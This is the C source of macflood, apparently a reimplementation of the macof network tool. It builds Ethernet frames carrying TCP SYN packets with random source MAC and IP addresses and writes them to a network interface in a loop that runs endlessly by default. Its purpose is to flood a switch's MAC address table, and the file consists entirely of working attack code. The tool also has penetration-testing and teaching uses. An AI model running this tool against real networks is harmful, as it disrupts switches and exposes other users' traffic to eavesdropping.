/*
  macflood.c

  Reimplementation of C port macof.c from PerlNet::RawIP distribution.

  Perl macof originally written by Ian Vitek <ian.vitek@infosec.se>
  C macof originally writen by Dug Song <dugsong@monkey.org>.

  Copyright (c) 2011 Steve Dierker <steve.dierker@obstkiste.org>

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  he Free Software Foundation, either version 3 of the License, or
  ())at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/


#include <sys/types.h>
#include <sys/param.h>
#include <stdio.h>
#include <string.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

#include "macflood.h"

void usage() {
  fprintf(stderr, "Version: " VERSION "\n"
      "Usage macflood [-s scr] [-d dst] [-e tha] [-x sport] [-y dport]"
      "\n               [-i interface] [-n times] [-v] [-r]\n");
  exit(1);
}

void gen_mac(u_char *mac)
{
   *((in_addr_t *)mac) = libnet_get_prand(LIBNET_PRu32);
   *((u_short *)(mac + 4)) = libnet_get_prand(LIBNET_PRu16);
}

int main (int argc, char *argv[]) {
  // Input Arguments from cmd-line
  char        *src_ip_addr = NULL;
  char        *dst_ip_addr = NULL;
  u_char      *dst_mac_addr = NULL;
  u_short     dst_port = 0;
  u_short     src_port = 0;
  char        *intf = NULL;
  u_int32_t         repeat = -1;
  // Variables for programm
  int c,i;
  int verbose = 0;
  int mode = LIBNET_DONT_RESOLVE;
  u_int32_t   src = 0;
  u_int32_t   dst = 0;
  u_int32_t   rand_src, rand_dst;
  u_int32_t   seq;
  u_short     dport, sport;
  u_char smaca[ETHER_ADDR_LEN], dmaca[ETHER_ADDR_LEN];
  libnet_t *llif;
  char ebuf[PCAP_ERRBUF_SIZE];
  libnet_ptag_t pkt;
  //Process cmd-line-arguments
  while ((c = getopt(argc, argv, "vrs:d:e:x:y:i:n:h?V")) != -1) {
      switch (c) {
      case 'v':
         verbose = 1;
         break;
      case 'r':
         mode = LIBNET_RESOLVE;
         break;
      case 's':
         src_ip_addr = optarg;
         break;
      case 'd':
         dst_ip_addr = optarg;
         break;
      case 'e':
         dst_mac_addr = (u_char *)ether_aton(optarg);
         break;
      case 'x':
         src_port = atoi(optarg);
         break;
      case 'y':
         dst_port = atoi(optarg);
         break;
      case 'i':
         intf = optarg;
         break;
      case 'n':
         if(atoi(optarg)>0)
          repeat = atoi(optarg);
         break;
      default:
         usage();
      }
  }

  argc -= optind;
  argv += optind;

  if (argc != 0)
    usage();

  // Check if interface exists
  if (!intf && (intf = pcap_lookupdev(ebuf)) == NULL)
    errx(1, "%s", ebuf);

  for(i=0; i != repeat; ++i) {

    // initiliaze libnet context
    if((llif=libnet_init(LIBNET_LINK, intf, ebuf))==NULL)
      errx(1, "%s", ebuf);

    // Convert src_ip_addr and dst_ip_addr in libnet format
    if(src_ip_addr != NULL)
      src = libnet_name2addr4(llif, src_ip_addr, mode);
    if(dst_ip_addr != NULL)
      dst = libnet_name2addr4(llif, dst_ip_addr, mode);

    // Initialize Randomgenerator
    libnet_seed_prand(llif);

    // Generate random source mac
    gen_mac(smaca);

    // Check if parameter given or need to be randomized
    if(dst_mac_addr == NULL) gen_mac(dmaca);
    else memcpy(dmaca, dst_mac_addr, sizeof(dmaca));

    if (src != 0) rand_src = src;
    else rand_src = libnet_get_prand(LIBNET_PRu32);

    if (dst != 0) rand_dst = dst;
    else rand_dst = libnet_get_prand(LIBNET_PRu32);

    if (dst_port != 0) dport = dst_port;
    else dport = libnet_get_prand(LIBNET_PRu16);

    if (src_port != 0) sport = src_port;
    else sport = libnet_get_prand(LIBNET_PRu16);

    seq = libnet_get_prand(LIBNET_PRu32);

    // Build TCP-Package
    if ((pkt = libnet_build_tcp(
        sport,                                    /* source port */
        dport,                                    /* destination port */
        0x01010101,                               /* sequence number */
        0x02020202,                               /* acknowledgement num */
        TH_SYN,                                   /* control flags */
        32767,                                    /* window size */
        0,                                        /* checksum */
        10,                                       /* urgent pointer */
        LIBNET_TCP_H + 20,                        /* TCP packet size */
        NULL,                                     /* payload */
        0,                                        /* payload size */
        llif,                                     /* libnet handle */
        0))==-1)                                  /* libnet id */
      errx(1, "Can't build TCP header: %s\n", libnet_geterror(llif));

    // Build IPv4 package
    if ((pkt = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + 20,          /* length */
        0,                                          /* TOS */
        242,                                        /* IP ID */
        0,                                          /* IP Frag */
        64,                                         /* TTL */
        IPPROTO_TCP,                                /* protocol */
        0,                                          /* checksum */
        rand_src,                                   /* source IP */
        rand_dst,                                   /* destination IP */
        NULL,                                       /* payload */
        0,                                          /* payload size */
        llif,                                       /* libnet handle */
        0))==-1)                                    /* libnet id */
      errx(1, "Can't build IPv4 header: %s\n", libnet_geterror(llif));

    // Build ethernet package
    if ((pkt = libnet_build_ethernet(
        dmaca,                                      /* ethernet destination */
        smaca,                                      /* ethernet source */
        ETHERTYPE_IP,                               /* protocol type */
        NULL,                                       /* payload */
        0,                                          /* payload size */
        llif,                                       /* libnet handle */
        0))==-1)                                    /* libnet id */
      errx(1, "Can't build ethernet header: %s\n", libnet_geterror(llif));

    // Write package to wire
    if ((c = libnet_write(llif))==-1)
      errx(1, "Write error: %s\n", libnet_geterror(llif));
    if(verbose)
      fprintf(stderr, "Nr: %d | SRC-IP:Port: %s:%d | DST-IP:Port %s:%d \n",
          i,
          libnet_addr2name4(rand_src, mode),
          sport,
          libnet_addr2name4(rand_dst, mode),
          dport
      // FIXME: MAC-Output
      //    ether_ntoa((struct ether_addr *)smaca),
      //    ether_ntoa((struct ether_addr *)dmaca)
      );

    libnet_destroy(llif);
  }
  return (EXIT_SUCCESS);
}

